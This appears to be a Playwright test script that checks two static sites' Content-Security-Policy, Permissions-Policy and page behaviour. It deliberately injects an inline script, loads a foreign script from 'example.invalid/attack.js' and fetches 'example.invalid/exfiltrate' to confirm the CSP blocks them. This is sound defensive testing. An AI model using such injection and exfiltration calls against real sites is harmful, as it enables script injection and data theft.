// Run after both site builds. No network, installs or cloud credentials required.
// PLAYWRIGHT_MODULE can point at an existing Playwright installation.
// DRUMROLL_FIXTURES must contain the existing real encoder pipeline's tiny fixtures.
const assert = require("node:assert/strict");
const fs = require("node:fs");
const path = require("node:path");
const http = require("node:http");
const crypto = require("node:crypto");
const { chromium } = require(
  process.env.PLAYWRIGHT_MODULE || "../../apps/oconnordev/node_modules/playwright",
);
const root = path.resolve(__dirname, "../..");
const fixtures = process.env.DRUMROLL_FIXTURES;
assert.ok(fixtures, "Set DRUMROLL_FIXTURES to existing real encoded test fixtures");
const sites = (process.env.SITES || "oconnordev,drumrollworld").split(",");
const policies = Object.fromEntries(
  [
    ["oconnordev", "production"],
    ["drumrollworld", "drumrollworld"],
  ]
    .filter(([site]) => sites.includes(site))
    .map(([site, stack]) => {
      const source = fs.readFileSync(
        path.join(root, `infra/aws/${stack}/static-site-delivery.tf`),
        "utf8",
      );
      const csp = source.match(/content_security_policy\s*=\s*"([^"]+)"/)?.[1];
      const permissions = source.match(
        /header\s*=\s*"Permissions-Policy"\s+override\s*=\s*true\s+value\s*=\s*"([^"]+)"/,
      )?.[1];
      assert.ok(
        csp && permissions,
        `${site}: enforced CSP and overriding Permissions-Policy required`,
      );
      return [site, { csp, permissions }];
    }),
);
const mime = {
  ".html": "text/html",
  ".css": "text/css",
  ".js": "text/javascript",
  ".wasm": "application/wasm",
  ".ktx2": "image/ktx2",
  ".jpg": "image/jpeg",
  ".png": "image/png",
  ".svg": "image/svg+xml",
  ".pdf": "application/pdf",
  ".ico": "image/x-icon",
};
const reports = [];
async function serve(site) {
  const dist = path.join(root, "apps", site, "dist");
  const server = http.createServer((req, res) => {
    const url = new URL(req.url, "http://localhost");
    if (url.pathname === "/__csp-probe.js") {
      res.setHeader("Content-Security-Policy", policies[site].csp);
      res.setHeader("Content-Type", "text/javascript");
      res.end(
        "try { new Function('return 1')(); window.evalBlocked = false; } catch { window.evalBlocked = true; }",
      );
      return;
    }
    let file = path.join(dist, url.pathname === "/" ? "index.html" : url.pathname);
    // Explicitly synthetic image content, genuinely encoded KTX2 files. Never
    // claim these are production artwork or representative production sizes.
    if (site === "drumrollworld" && url.pathname.startsWith("/images/")) {
      file = url.pathname.endsWith(".ktx2")
        ? path.join(
            fixtures,
            "derived-fixtures/globe",
            path.basename(url.pathname).replace(/(?:2k|4k|8k|10k)/, "16px"),
          )
        : path.join(fixtures, "thumbnail-fixtures/fixture.thumb.jpg");
    }
    res.setHeader("Content-Security-Policy", policies[site].csp);
    res.setHeader("Permissions-Policy", policies[site].permissions);
    if (!fs.existsSync(file) || !fs.statSync(file).isFile()) {
      res.statusCode = 404;
      file = site === "drumrollworld" ? path.join(dist, "404.html") : null;
    }
    res.setHeader(
      "Content-Type",
      file ? mime[path.extname(file)] || "application/octet-stream" : "text/plain",
    );
    res.end(file ? fs.readFileSync(file) : "Not found");
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  return { server, origin: `http://127.0.0.1:${server.address().port}` };
}
async function observe(context) {
  await context.addInitScript(() => {
    window.cspViolations = [];
    document.addEventListener("securitypolicyviolation", (e) =>
      window.cspViolations.push({ directive: e.effectiveDirective, blocked: e.blockedURI }),
    );
    window.transcodes = [];
    const Original = window.Worker;
    window.Worker = class extends Original {
      constructor(...args) {
        super(...args);
        this.addEventListener("message", (e) => {
          if (e.data.type === "transcode")
            window.transcodes.push({
              format: e.data.data.format,
              mipmaps: e.data.data.faces[0].mipmaps.length,
            });
        });
      }
    };
  });
  const page = await context.newPage();
  const errors = [],
    external = [],
    consoleErrors = [];
  page.on("pageerror", (e) => errors.push(String(e)));
  page.on("console", (m) => {
    if (m.type() === "error") consoleErrors.push(m.text());
  });
  await context.route("**/*", (route) => {
    if (!/^https?:\/\/127\.0\.0\.1:/.test(route.request().url())) {
      external.push(route.request().url());
      return route.abort();
    }
    return route.continue();
  });
  return { page, errors, external, consoleErrors };
}
(async () => {
  const browser = await chromium.launch({
    executablePath: process.env.CHROMIUM || "/usr/bin/chromium",
    headless: true,
    args: ["--no-sandbox", "--use-angle=swiftshader", "--enable-unsafe-swiftshader"],
  });
  try {
    for (const site of sites) {
      const { server, origin } = await serve(site);
      try {
        for (const mode of process.env.MODES
          ? process.env.MODES.split(",")
          : site === "oconnordev"
            ? ["resume"]
            : ["globe", "webgl-unavailable", "404"]) {
          const context = await browser.newContext({ viewport: { width: 1440, height: 900 } });
          try {
            if (mode === "webgl-unavailable")
              await context.addInitScript(() => {
                const original = HTMLCanvasElement.prototype.getContext;
                HTMLCanvasElement.prototype.getContext = function (type, ...args) {
                  return /webgl/.test(type) ? null : original.call(this, type, ...args);
                };
              });
            const { page, errors, external, consoleErrors } = await observe(context);
            const response = await page.goto(origin + (mode === "404" ? "/missing-object" : "/"), {
              waitUntil: "networkidle",
            });
            assert.equal(response.headers()["content-security-policy"], policies[site].csp);
            assert.equal(response.headers()["permissions-policy"], policies[site].permissions);
            if (mode === "resume") {
              assert.equal(response.status(), 200);
              const jsonld = await page.locator('script[type="application/ld+json"]').textContent();
              assert.ok(JSON.parse(jsonld));
              assert.ok(
                policies[site].csp.includes(
                  `'sha256-${crypto.createHash("sha256").update(jsonld).digest("base64")}'`,
                ),
              );
              assert.equal(
                await page
                  .locator(".block-content")
                  .first()
                  .evaluate((e) => getComputedStyle(e).fontSize),
                "14px",
              );
              const pdf = await context.request.get(`${origin}/resume.pdf`);
              assert.equal(pdf.status(), 200);
              assert.ok((await pdf.body()).subarray(0, 5).equals(Buffer.from("%PDF-")));
              for (const viewport of [
                { width: 390, height: 844 },
                { width: 1440, height: 900 },
              ]) {
                await page.setViewportSize(viewport);
                assert.ok(
                  await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth),
                );
              }
            } else if (mode === "404") {
              assert.equal(response.status(), 404);
              assert.match(await page.locator("h1").innerText(), /404/);
              assert.equal(
                await page.locator("body").evaluate((e) => getComputedStyle(e).backgroundColor),
                "rgb(16, 24, 32)",
              );
              assert.equal(
                await page.locator("main").evaluate((e) => getComputedStyle(e).maxWidth),
                "576px",
              );
              assert.equal(await page.locator("a").getAttribute("href"), "/");
            } else {
              try {
                await page.waitForFunction(() => !document.getElementById("loadingScreen"));
              } catch (error) {
                console.error({
                  site,
                  mode,
                  consoleErrors,
                  errors,
                  external,
                  violations: await page.evaluate(() => window.cspViolations),
                  transcodes: await page.evaluate(() => window.transcodes),
                });
                throw error;
              }
              assert.ok((await page.locator("#entryList > .entry-item").count()) > 0);
              if (mode === "globe") {
                try {
                  const expectedTranscodes = await page.evaluate(() => {
                    const gl = document.querySelector("canvas").getContext("webgl2");
                    const size = gl.getParameter(gl.MAX_TEXTURE_SIZE);
                    // Exact counts include all automatic tiers up to the actual GPU ceiling.
                    return size >= 10800 ? 14 : size >= 8192 ? 11 : size >= 4096 ? 7 : 4;
                  });
                  await page.waitForFunction(
                    (count) => window.transcodes.length === count,
                    expectedTranscodes,
                  );
                } catch (error) {
                  console.error({
                    consoleErrors,
                    errors,
                    violations: await page.evaluate(() => window.cspViolations),
                  });
                  throw error;
                }
                assert.equal(await page.locator("#globeUnavailable").count(), 0);
                assert.equal(await page.locator("canvas").count(), 1);
                // Pin every injected stylesheet to its actual bytes, not unsafe-inline.
                for (const css of await page.locator("style").allTextContents()) {
                  const hash = crypto.createHash("sha256").update(css).digest("base64");
                  assert.ok(
                    policies[site].csp.includes(`'sha256-${hash}'`),
                    `Missing runtime style hash ${hash}`,
                  );
                }
              } else await page.locator("#globeUnavailable").waitFor();
              const imageSchemes = await page.evaluate(async () => {
                const response = await fetch(
                  document.querySelector(".entry-item.active .entry-main-img").src,
                );
                const blob = await response.blob();
                const data = await new Promise((resolve) => {
                  const reader = new FileReader();
                  reader.onload = () => resolve(reader.result);
                  reader.readAsDataURL(blob);
                });
                const objectUrl = URL.createObjectURL(blob);
                try {
                  const widths = [];
                  for (const src of [objectUrl, data]) {
                    const image = new Image();
                    image.src = src;
                    await image.decode();
                    widths.push(image.naturalWidth);
                  }
                  return widths;
                } finally {
                  URL.revokeObjectURL(objectUrl);
                }
              });
              assert.ok(
                imageSchemes.every((width) => width > 0),
                "data/blob images must decode under the actual HCL CSP",
              );
              const title = await page.locator("#activeTitle").innerText();
              await page.locator("#nextBtn").click();
              await page.waitForFunction(
                (t) => document.getElementById("activeTitle").textContent !== t,
                title,
              );
              await page.locator("#searchBar").fill("zzzznotfoundzzzz");
              assert.equal(await page.locator("#entryList > .entry-item").count(), 0);
              assert.equal(
                await page
                  .locator("#entryList > div")
                  .evaluate((e) => getComputedStyle(e).paddingLeft),
                "10px",
              );
              await page.locator("#searchBar").fill("");
              await page.locator(".entry-item.active .entry-main-img").click();
              await page.waitForFunction(
                () =>
                  document.getElementById("lightbox").classList.contains("open") &&
                  document.getElementById("lightboxImg").naturalWidth > 0,
              );
              await page.locator("#lbClose").click();
              await page.setViewportSize({ width: 390, height: 844 });
              await page.locator("#searchBar").fill("drum");
              assert.ok((await page.locator("#entryList > .entry-item").count()) > 0);
              if (mode === "globe") assert.deepEqual(consoleErrors, []);
            }
            assert.deepEqual(
              await page.evaluate(() => window.cspViolations),
              [],
              `${site}/${mode}: compatibility CSP violations`,
            );
            assert.deepEqual(errors, []);
            assert.deepEqual(external, []);
            const denied = await page.evaluate(() =>
              ["camera", "microphone", "geolocation", "payment", "usb", "fullscreen"].map((f) => [
                f,
                document.featurePolicy.allowsFeature(f),
              ]),
            );
            assert.ok(
              denied.every(([, allowed]) => !allowed),
              JSON.stringify(denied),
            );
            // Deliberately attack after compatibility assertions. DevTools evaluation
            // bypasses CSP; eval is therefore probed inside a same-origin script.
            if (site === "drumrollworld") {
              await page.evaluate(
                () =>
                  new Promise((resolve) => {
                    const script = document.createElement("script");
                    script.src = "/__csp-probe.js";
                    script.onload = resolve;
                    document.body.append(script);
                  }),
              );
              assert.equal(
                await page.evaluate(() => window.evalBlocked),
                true,
                "Drumroll must block JavaScript dynamic execution while Basis transcodes",
              );
            }
            const blocked = await page.evaluate(async () => {
              const script = document.createElement("script");
              script.textContent = "window.injected = true";
              document.body.append(script);
              const foreignScript = document.createElement("script");
              foreignScript.src = "https://example.invalid/attack.js";
              document.body.append(foreignScript);
              try {
                await fetch("https://example.invalid/exfiltrate");
              } catch {}
              await new Promise((r) => setTimeout(r, 100));
              return { inlineBlocked: !window.injected, violations: window.cspViolations };
            });
            assert.ok(blocked.inlineBlocked);
            assert.ok(
              blocked.violations.some(
                (v) => v.directive === "script-src-elem" && v.blocked === "inline",
              ),
            );
            assert.ok(
              blocked.violations.some(
                (v) =>
                  v.directive === "script-src-elem" &&
                  v.blocked === "https://example.invalid/attack.js",
              ),
            );
            assert.ok(blocked.violations.some((v) => v.directive === "connect-src"));
            assert.deepEqual(external, [], "CSP must block third-party before network");
            reports.push({
              site,
              mode,
              status: response.status(),
              transcodes: await page.evaluate(() => window.transcodes.length),
              compatibilityViolations: 0,
              denied,
              inlineAndForeignAttacksBlocked: true,
              javascriptEvalBlocked:
                site === "drumrollworld"
                  ? await page.evaluate(() => window.evalBlocked)
                  : "no executable script allowed",
            });
          } finally {
            await context.close();
          }
        }
      } finally {
        await new Promise((r) => server.close(r));
      }
    }
    console.log(JSON.stringify(reports, null, 2));
  } finally {
    await browser.close();
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
